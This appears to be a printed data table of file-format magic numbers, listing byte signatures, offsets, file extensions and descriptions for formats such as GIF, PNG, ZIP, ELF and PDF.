# 8                                  ..DT                                    0
# 9                                   ...                                    0
# 10                                 ....                                    0
# 11                               ftyp3g                                    4
# 12                                   ..                                    0
# 13                                   ..                                    0
# 14                        BACKMIKE DISK                                    0
# 15                                  BZh                                    0
# 16                        GIF87a GIF89a                                    0
# 17                            II*. MM.*                                    0
# 18                          II*..... CR                                    0
# 19                                 .*_.                                    0
# 20                                 RNC.                                    0
# 21                            SDPX XPDS                                    0
# 22                                 v/1.                                    0
# 23                                 BPGû                                    0
# 24   ÿØÿÛ ÿØÿà..JFIF..ÿØÿî ÿØÿá..Exif..                                    0
# 25                        FORM.... ILBM                                0 any
# 26                        FORM.... 8SVX                                0 any
# 27                        FORM.... ACBM                                0 any
# 28                        FORM.... ANBM                                0 any
# 29                        FORM.... ANIM                                0 any
# 30                        FORM.... FAXX                                0 any
# 31                        FORM.... FTXT                                0 any
# 32                        FORM.... SMUS                                0 any
# 33                        FORM.... CMUS                                0 any
# 34                        FORM.... YUVN                                0 any
# 35                        FORM.... FANT                                0 any
# 36                        FORM.... AIFF                                0 any
# 37                                 INDX                                    0
# 38                                 LZIP                                    0
# 39                                   MZ                                    0
# 40                                 PK..                                    0
# 41                              Rar!...                                    0
# 42                             Rar!....                                    0
# 43                                 .ELF                                    0
# 44                             .PNG....                                    0
# 45                                 Êþº¾                                    0
# 46                                  ï»¿                                    0
# 47                             ........                             0 0x1000
# 48                             ........                             0 0x1000
# 49                             ........                                    0
# 50                             ........                                    0
# 51                                   ..                                    0
# 52                                 ....                                    0
# 53                                 %!PS                                    0
# 54                                %PDF-                                    0
# 55                    0&²u.fÏ .¦Ù.ª.bÎl                                    0
# 56                             $SDI0001                                    0
# 57                                 OggS                                    0
# 58                                 8BPS                                    0
# 59                        RIFF.... WAVE                                    0
# 60                        RIFF.... AVI.                                    0
# 61                                   ÿû                                    0
# 62                                  ID3                                    0
# 63                                   BM                                    0
# 64                                CD001                  0x8001 0x88010x9001
# 65                           SIMPLE = T                                    0
# 66                                 fLaC                                    0
# 67                                 MThd                                    0
# 68                                  NaN                                    0
# 69                             dex.035.                                    0
# 70                                  KDM                                    0
# 71                                 Cr24                                    0
# 72                                 AGD3                                    0
# 73               ....BOBO ........ ....                                    0
# 74               ....BOBO ........ ....                                    0
# 75                       ER.... ãER....                                    0
# 76                              x.s.bb`                                    0
# 77                                 xar!                                    0
# 78                             PMOCCMOC                                    0
# 79                                  NES                                    0
# 80                     ustar.00 ustar .                                0x101
# 81                                  TOX                                    0
# 82                                 MLVI                                    0
# 83                             DCM PA30                                    0
# 84                                7z¼¯'                                    0
# 85                                   ..                                    0
# 86                              ²7zXZ..                                    0
# 87                                 ."M.                                    0
# 88                                 MSCF                                    0
# 89                             SZDD....                                    0
# 90                                 FLIF                                    0
# 91                                 .Eß£                                    0
# 92                                  MIL                                    0
# 93                      AT&TFORM....DJV                                    0
# 94                                   0.                                    0
# 95                                 DICM                                 0x80
# 96                                 wOFF                                    0
# 97                                 wOF2                                    0
# 98                                <?xml                                    0
# 99                                 .asm                                    0
# 100                                 NaN                                    0
# 101                             CWS FWS                                    0
# 102                            !<arch>.                                    0
# 103                       RIFF.... WEBP                                    0
# 104                                '..V                                    0
# 105                              {\rtf1                                    0
# 106                                TAPE                                    0
# 107                                   G  0 0xBC 0x178 ... (every 188th byte)
# 108                                ....                                    0
# 109                           ....G....                                    0
# 110                                ....                                    0
# 111                                bvx2                                    0
# 112                                 ORC                                    0
# 113                                Obj.                                    0
# 114                                SEQ6                                    0
# 115                                e.xV                                    0
# 116                                UU¬¬                                    0
# 117                                 xV4                                    0
# 118                                PAR1                                    0
# 119                                EMX2                                    0
# 120                                EMU3                                    0
# 121                                .Lua                                    0
# 122                           book mark                                    0
# 123                      [ZoneTransfer]                                    0
# 124                           Received:                                    0
# 125                         ..b .«.....                                    0
# 126                                (µ/ý                                    0
#
#                                                                                                                   File extension  \
# 0                                                                                                                           pcap
# 1                                                                                                                         pcapng
# 2                                                                                                                            rpm
# 3                                                                                                                            bin
# 4                                                                                                                   PICPIFSEAYTR
# 5                                                                                                                            PDB
# 6                                                                                                                            DBA
# 7                                                                                                                            DBA
# 8                                                                                                                            TDA
# 9                                                                                                                            NaN
# 10                                                                                                                           ico
# 11                                                                                                                        3gp3g2
# 12                                                                                                                        ztar.z
# 13                                                                                                                        ztar.z
# 14                                                                                                                           bac
# 15                                                                                                                           bz2
# 16                                                                                                                           gif
# 17                                                                                                                       tiftiff
# 18                                                                                                                           cr2
# 19                                                                                                                           cin
# 20                                                                                                                           NaN
# 21                                                                                                                           dpx
# 22                                                                                                                           exr
# 23                                                                                                                           bpg
# 24                                                                                                                       jpgjpeg
# 25                                                                                                                 ilbmlbmibmiff
# 26                                                                                                              8svx8svsvxsndiff
# 27                                                                                                                       acbmiff
# 28                                                                                                                       anbmiff
# 29                                                                                                                       animiff
# 30                                                                                                                    faxxfaxiff
# 31                                                                                                                       ftxtiff
# 32                                                                                                                 smussmumusiff
# 33                                                                                                                    cmusmusiff
# 34                                                                                                                    yuvnyuviff
# 35                                                                                                                           iff
# 36                                                                                                             aiffaifaifcsndiff
# 37                                                                                                                           idx
# 38                                                                                                                            lz
# 39                                                                                                                           exe
# 40                                                                                         zipjarodtodsodpdocxxlsxpptxvsdxapkaar
# 41                                                                                                                           rar
# 42                                                                                                                           rar
# 43                                                                                                                           NaN
# 44                                                                                                                           png
# 45                                                                                                                         class
# 46                                                                                                                           NaN
# 47                                                                                                                           NaN
# 48                                                                                                                           NaN
# 49                                                                                                                           NaN
# 50                                                                                                                           NaN
# 51                                                                                                                           NaN
# 52                                                                                                                           NaN
# 53                                                                                                                            ps
# 54                                                                                                                           pdf
# 55                                                                                                                     asfwmawmv
# 56                                                                                                                           NaN
# 57                                                                                                                     oggogaogv
# 58                                                                                                                           psd
# 59                                                                                                                           wav
# 60                                                                                                                           avi
# 61                                                                                                                           mp3
# 62                                                                                                                           mp3
# 63                                                                                                                        bmpdib
# 64                                                                                                                           iso
# 65                                                                                                                          fits
# 66                                                                                                                          flac
# 67                                                                                                                       midmidi
# 68                                                                                                                  docxlspptmsg
# 69                                                                                                                           dex
# 70                                                                                                                          vmdk
# 71                                                                                                                           crx
# 72                                                                                                                           fh8
# 73                                                                                                                           cwk
# 74                                                                                                                           cwk
# 75                                                                                                                         toast
# 76                                                                                                                           dmg
# 77                                                                                                                           xar
# 78                                                                                                                           dat
# 79                                                                                                                           nes
# 80                                                                                                                           tar
# 81                                                                                                                           tox
# 82                                                                                                                           MLV
# 83                                                                                                                           NaN
# 84                                                                                                                            7z
# 85                                                                                                                      gztar.gz
# 86                                                                                                                      xztar.xz
# 87                                                                                                                           lz4
# 88                                                                                                                           cab
# 89   Various. (Replacing the last character of the original file extension with an underscore, e.g. setup.exe becomes setup.ex_)
# 90                                                                                                                          flif
# 91                                                                                                             mkvmkamksmk3dwebm
# 92                                                                                                                           stg
# 93                                                                                                                       djvudjv
# 94                                                                                                                           der
# 95                                                                                                                           dcm
# 96                                                                                                                          woff
# 97                                                                                                                         woff2
# 98                                                                                                                           XML
# 99                                                                                                                          wasm
# 100                                                                                                                          lep
# 101                                                                                                                          swf
# 102                                                                                                                          deb
# 103                                                                                                                         webp
# 104                                                                                                                          NaN
# 105                                                                                                                          rtf
# 106                                                                                                                          NaN
# 107                                                                                                                   ts tsv tsa
# 108                                                                                                                      m2p vob
# 109                                                                                                                     mpg mpeg
# 110                                                                                                                         zlib
# 111                                                                                                                        lzfse
# 112                                                                                                                          orc
# 113                                                                                                                         avro
# 114                                                                                                                           rc
# 115                                                                                                                      p25 obt
# 116                                                                                                                          pcv
# 117                                                                                     pbt pdt pea peb pet pgt pict pjt pkt pmt
# 118                                                                                                                          NaN
# 119                                                                                                                          ez2
# 120                                                                                                                      ez3 iso
# 121                                                                                                                         luac
# 122                                                                                                                        alias
# 123                                                                                                                   Identifier
# 124                                                                                                                          eml
# 125                                                                                                                          tde
# 126                                                                                                                          zst
#
#                                                                                                                                                                        Description
# 0                                                                                                                                                           Libpcap File Format[1]
# 1                                                                                                                                         PCAP Next Generation Dump File Format[2]
# 2                                                                                                                                         RedHat Package Manager (RPM) package [3]
# 3                                                                                                                                                 Amazon Kindle Update Package [4]
# 4                                                               IBM Storyboard bitmap file Windows Program Information File Mac Stuffit Self-Extracting Archive IRIS OCR data file
# 5                                                                                                                                                 PalmPilot Database/Document File
# 6                                                                                                                                                    Palm Desktop Calendar Archive
# 7                                                                                                                                                       Palm Desktop To Do Archive
# 8                                                                                                                                                    Palm Desktop Calendar Archive
# 9                                                                                                                                           Palm Desktop Data File (Access format)
# 10                                                                                                                                     Computer icon encoded in ICO file format[5]
# 11                                                                                                              3rd Generation Partnership Project 3GPP and 3GPP2 multimedia files
# 12                                                                                                                compressed file (often tar zip) using Lempel-Ziv-Welch algorithm
# 13                                                                                                                             Compressed file (often tar zip) using LZH algorithm
# 14                                     File or tape containing a backup done with AmiBack on an Amiga. It typically is paired with an index file (idx) with the table of contents.
# 15                                                                                                                                           Compressed file using Bzip2 algorithm
# 16                                                                                                                  Image file encoded in the Graphics Interchange Format (GIF)[6]
# 17                                                                                                                                                        Tagged Image File Format
# 18                                                                                             Canon RAW Format Version 2[7]Canon's RAW format is based on the TIFF file format[8]
# 19                                                                                                                                                              Kodak Cineon image
# 20                                                                                                       Compressed file using Rob Northen Compression (version 1 and 2) algorithm
# 21                                                                                                                                                                 SMPTE DPX image
# 22                                                                                                                                                                   OpenEXR image
# 23                                                                                                                                              Better Portable Graphics format[9]
# 24                                                                                                                                     JPEG raw or in the JFIF or Exif file format
# 25                                                                                                                                                    IFF Interleaved Bitmap Image
# 26                                                                                                                                                         IFF 8-Bit Sampled Voice
# 27                                                                                                                                                         Amiga Contiguous Bitmap
# 28                                                                                                                                                             IFF Animated Bitmap
# 29                                                                                                                                                               IFF CEL Animation
# 30                                                                                                                                                             IFF Facsimile Image
# 31                                                                                                                                                              IFF Formatted Text
# 32                                                                                                                                                        IFF Simple Musical Score
# 33                                                                                                                                                               IFF Musical Score
# 34                                                                                                                                                                   IFF YUV Image
# 35                                                                                                                                                         Amiga Fantavision Movie
# 36                                                                                                                                                   Audio Interchange File Format
# 37                                                                                                 Index file to a file or tape containing a backup done with AmiBack on an Amiga.
# 38                                                                                                                                                            lzip compressed file
# 39                                                                                                         DOS MZ executable file format and its descendants (including NE and PE)
# 40                                                                                                                zip file format and formats based on it, such as JAR, ODF, OOXML
# 41                                                                                                                                            RAR archive version 1.50 onwards[10]
# 42                                                                                                                                             RAR archive version 5.0 onwards[11]
# 43                                                                                                                                                  Executable and Linkable Format
# 44                                                                                                                       Image encoded in the Portable Network Graphics format[12]
# 45                                                                                                                                              Java class file, Mach-O Fat Binary
# 46                                                                                                             UTF-8 encoded Unicode byte order mark, commonly seen in text files.
# 47                                                                                                                                                          Mach-O binary (32-bit)
# 48                                                                                                                                                          Mach-O binary (64-bit)
# 49                                                                                                                        Mach-O binary (reverse byte ordering scheme, 32-bit)[13]
# 50                                                                                                                        Mach-O binary (reverse byte ordering scheme, 64-bit)[13]
# 51                                                                                           Byte-order mark for text file encoded in little-endian 16-bit Unicode Transfer Format
# 52                                                                                           Byte-order mark for text file encoded in little-endian 32-bit Unicode Transfer Format
# 53                                                                                                                                                             PostScript document
# 54                                                                                                                                                                PDF document[14]
# 55                                                                                                                                                     Advanced Systems Format[15]
# 56                                                                                                                  System Deployment Image, a disk image format used by Microsoft
# 57                                                                                                                                      Ogg, an open source media container format
# 58                                                                                                                   Photoshop Document file, Adobe Photoshop's native file format
# 59                                                                                                                                                      Waveform Audio File Format
# 60                                                                                                                                             Audio Video Interleave video format
# 61                                                                           MPEG-1 Layer 3 file without an ID3 tag or with an ID3v1 tag (which's appended at the end of the file)
# 62                                                                                                                                                MP3 file with an ID3v2 container
# 63                                                                                                                      BMP file, a bitmap format used mostly in the Windows world
# 64                                                                                                                                                   ISO9660 CD/DVD image file[16]
# 65                                                                                                                                      Flexible Image Transport System (FITS)[17]
# 66                                                                                                                                                   Free Lossless Audio Codec[18]
# 67                                                                                                                                                             MIDI sound file[19]
# 68       Compound File Binary Format, a container format used for document by older versions of Microsoft Office.[20] It is however an open format used by other programs as well.
# 69                                                                                                                                                               Dalvik Executable
# 70                                                                                                                                                              VMDK files[21][22]
# 71                                                                                                                                 Google Chrome extension[23] or packaged app[24]
# 72                                                                                                                                                 FreeHand 8 document[25][26][27]
# 73                                                                                                                                                           AppleWorks 5 document
# 74                                                                                                                                                           AppleWorks 6 document
# 75                                                                                                         Roxio Toast disc image file, also some .dmg-files begin with same bytes
# 76                                                                                                                                                           Apple Disk Image file
# 77                                                                                                                                                   eXtensible ARchive format[28]
# 78                                                          Windows Files And Settings Transfer Repository[29] See also USMT 3.0 (Win XP)[30] and USMT 4.0 (Win 7)[31] User Guides
# 79                                                                                                                                      Nintendo Entertainment System ROM file[32]
# 80                                                                                                                                                                 tar archive[33]
# 81                                                                                                                                             Open source portable voxel file[34]
# 82                                                                                                                                                    Magic Lantern Video file[35]
# 83                                                                                                                                     Windows Update Binary Delta Compression[36]
# 84                                                                                                                                                               7-Zip File Format
# 85                                                                                                                                                        GZIP compressed file[37]
# 86                                                                                                                                  XZ compression utility using LZMA2 compression
# 87                                                                                               LZ4 Frame Format[38] Remark: LZ4 block format does not offer any magic bytes.[39]
# 88                                                                                                                                                          Microsoft Cabinet file
# 89   Microsoft compressed file in Quantum format, used prior to Windows XP. File can be decompressed using Extract.exe or Expand.exe distributed with earlier versions of Windows.
# 90                                                                                                                                                      Free Lossless Image Format
# 91                                                                                                                                        Matroska media container, including WebM
# 92                                  "SEAN : Session Analysis" Training file. Also used in compatible software "Rpw : Rowperfect for Windows" and "RP3W : ROWPERFECT3 for Windows".
# 93                                                                            DjVu documentThe following byte is either 55 (U) for single-page or 4D (M) for multi-page documents.
# 94                                                                                                                                                   DER encoded X.509 certificate
# 95                                                                                                                                                       DICOM Medical File Format
# 96                                                                                                                                                            WOFF File Format 1.0
# 97                                                                                                                                                            WOFF File Format 2.0
# 98                                                                                                              eXtensible Markup Language when using the ASCII character encoding
# 99                                                                                                                                                   WebAssembly binary format[40]
# 100                                                                                                                                               Lepton compressed JPEG image[41]
# 101                                                                                                                                                                     flash .swf
# 102                                                                                                                                                                 linux deb file
# 103                                                                                                                                                         Google WebP image file
# 104                                                                                                                         U-Boot / uImage. Das U-Boot Universal Boot Loader.[42]
# 105                                                                                                                                                               Rich Text Format
# 106                                                                                                                                                          Microsoft Tape Format
# 107                                                                                                                                          MPEG Transport Stream (MPEG-2 Part 1)
# 108                                                                                                  MPEG Program Stream (MPEG-1 Part 1 (essentially identical) and MPEG-2 Part 1)
# 109                                                                      MPEG Program Stream MPEG Transport Stream MPEG-1 video and MPEG-2 video (MPEG-1 Part 2 and MPEG-2 Part 2)
# 110                                                                                                                        No Compression/low Default Compression Best Compression
# 111                                                                       LZFSE - Lempel-Ziv style data compression algorithm using Finite State Entropy coding. OSS by Apple.[43]
# 112                                                                                                                                Apache ORC (Optimized Row Columnar) file format
# 113                                                                                                                                                 Apache Avro binary file format
# 114                                                                                                                                                    RCFile columnar file format
# 115                                                                                                                                                      PhotoCap Object Templates
# 116                                                                                                                                                                PhotoCap Vector
# 117                                                                                                                                                              PhotoCap Template
# 118                                                                                                                                            Apache Parquet columnar file format
# 119                                                                                                                                                     Emulator Emaxsynth samples
# 120                                                                                                                                                     Emulator III synth samples
# 121                                                                                                                                                               Lua bytecode[44]
# 122                                                                                                                                           macOS file Alias[45] (Symbolic link)
# 123                                                                                                                           Microsoft Zone Identifier for URL Security Zones[46]
# 124                                                                                                                                                         Email Message var5[47]
# 125                                                                                                                                                             Tableau Datasource
# 126                                                                                                                                              Zstandard compressed file[48][49]
